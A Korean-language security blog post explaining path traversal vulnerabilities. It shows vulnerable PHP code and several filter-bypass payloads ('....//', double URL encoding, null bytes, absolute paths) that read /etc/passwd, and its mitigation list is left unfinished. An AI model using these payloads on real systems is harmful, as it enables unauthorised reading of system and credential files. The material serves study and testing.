---
layout: single
title: Path Traversal
categories: Web-vuln
tag: [Path Traversal, web, web vulnerability, injection]
toc: true
author_profile: false
---
# Path Traversal 이란 무엇인가?

> ./(현재 디렉토리) 또는 ../(상위 디렉토리로 이동)를 나타내는 문자들이 제대로 필터링되지 않아 파일 시스템 API로 전달되어, 허용된 디렉토리가 아닌 숨겨진 디렉토리 및 파일에 대한 무단 access를 가능하게 하는 취약점이며, 보통 File 명과 같이 사용자의 입력값이 전달되어, 찾아오는 로직에서 많이 발견된다.

<hr>

**Vulnerability Code**

```php
<?php
$template = 'red.php';
if (isset($_COOKIE['TEMPLATE'])) {
    $template = $_COOKIE['TEMPLATE'];
}
include "/home/users/phpguru/templates/" . $template;

인용 : https://en.wikipedia.org/wiki/Directory_traversal_attack
```

위와 같은 File을 가져오는 로직이 구성되어있다고 생각해보자. 그럼 사용자의 입력값이 include "/home/users/phpguru/templates/" . 뒤에 고스란히 이어붙여 진다. 이 때 디렉토리 이동 명령어가 필터링 되어 제거되지않고 적용된다면 어떻게 될까?
<br><br>

```
GET /vulnerable.php HTTP/1.0
Cookie: TEMPLATE=../../../../../../../../../etc/passwd
```

```
HTTP/1.0 200 OK
Content-Type: text/html
Server: Apache

root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh 
daemon:*:1:1::/tmp: 
phpguru:f8fk3j1OIf31.:182:100:Developer:/home/users/phpguru/:/bin/csh
```

위와같이 passwd 파일을 탈취 될 수 있으며, 큰 피해로 이어질 수 있다.
<br><br>
이러한 취약점은 파일 경로에서 불러오는 경우와, API 요청을 통해 불러올 수도 있다.

```
/var/www/images/test.png/../../../etc/passwd

'''

https://insecure-test.com/findimage?filename=../../../etc/passwd
```

## 공격 표면

🌝 **<u>Path Traversal 취약점은 어떤 부분에서 나타나고 테스팅 해볼 수 있을까</u>** 
{: .notice--primary} 
<hr>
사용자의 요청이 서버내의 path로 연결되는 구간, API 요청에 의해 파일값을 불러오는 구간이 공격표면이 될 수 있다. 
<br>
./ 또는 ../ 와 같은 경로이동 문자열을 넣어봄으로써 응답값이 어떻게 돌아오는지 확인하면 Path Traversal 취약점이 존재하는지에 대한 유무 판단이 가능하다.

```
/var/www/images/test.jpg -> 200(ok)
/var/www/images/.test.jpg -> 200(ok)
/var/www/images/../images/test.jpg -> 200(ok)
```

하지만 위의 테스팅에서 200ok 를 받는다고 무조건 Path Traversal 취약점이 존재한다고 확신하기에는 불분명 하다.
<br>
이는 ./ 문자를 Path 그대로 받아들이는지 ./문자를 필터링하여 제거시켰는지에 대해 확실치 않기 때문이다.
<br>
이런 경우 ..//와 같이 ./가 제거되더라도 ..// → ./ 되기 때문에 테스팅해볼만하다.

```
/var/www/images/..//test.jpg
```

**<u>만약 위의 테스트 결과가 404(Not Found) 가 뜬다면 이는 ./ 문자열이 제거가 되지 않는다는것을 의미한다.  200 ok가 반환 되더라도, ./가 필터링 되어 ./가되거나 아니면 이러한 제거로직을 반복구성 해놓았을 가능성도 존재한다.</u>**

## Bypass - Path Traversal
### Basic Bypass

```
GET /image?filename=../../../etc/passwd 200 (ok)
```

경로 이동 문자열을 통해 파일 시스템 서버의 최상단으로 올라가 passwd파일을 추출한다.

### Traversal sequences blocking

./ ../ 와 같은 시퀀스를 차단하는 로직이 구현되어 있더라도, 파일 시스템이 절대경로를 통해 파일을 가져올 경우 경로 이동 문자열 없이 원하는 파일을 가져올 수 있다.

```
GET /image?filename=/etc/passwd HTTP/2 200 (ok)
GET /image?filename=../../../etc/passwd HTTP/2 400 Bad Request
```

### Traversal sequences blocking2

../ 시퀀스가 필터링 되어 차단되더라도 ….// 문자열을 입력했을 때 로직이 반복적으로 탐지하여 차단하는 경우가 아니라면 ../ 가 사라지고 ….// → ../가 남아 우회가능성이 존재한다.

```
GET /image?filename=../../../etc/passwd HTTP/2 400 Bad Request
GET /image?filename=....//....//....//etc/passwd HTTP/2 200 (ok)
```

### Traversal sequences blocking3

입력값 검증 후 제거하는 로직이 반복적으로 순회하도록 되어있을 경우, URL 인코딩 Double 인코딩
또는 비표준 인코딩 등을 사용하여 우회할 수 있다.

```
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2 200 (ok)
```

### 정해진 위치에서부터의 경로 탐색

개발자가 특정 파일을 찾기위해서는 개발자가 정해놓은 특정 위치에서부터 절대경로로 검색해야 찾을 수 있도록 설정해놨을 경우도 존재한다.

```
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
```

### 만약 파일시스템에서 특정 확장자로 끝나는지에 대한 검증 로직이 존재한다면?

null 바이트 문자를 이용하여 우회할 수 있다.

```
GET /image?filename=../../../etc/passwd%00.jpg HTTP/2 200(ok)
```

<br><hr>
<div class="notice">
  <h4>이러한 진입점들을 잘 찾아내는것이 중요하다. 파일의 본문내용을 경로로 사용되는 부분도 존재하며, 요청값과 응답값을 잘 확인하자.</h4>
</div>
<hr>

# 대응 방안
1. 입력값에 대한 유효성 검사.
2. 

# Referance
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal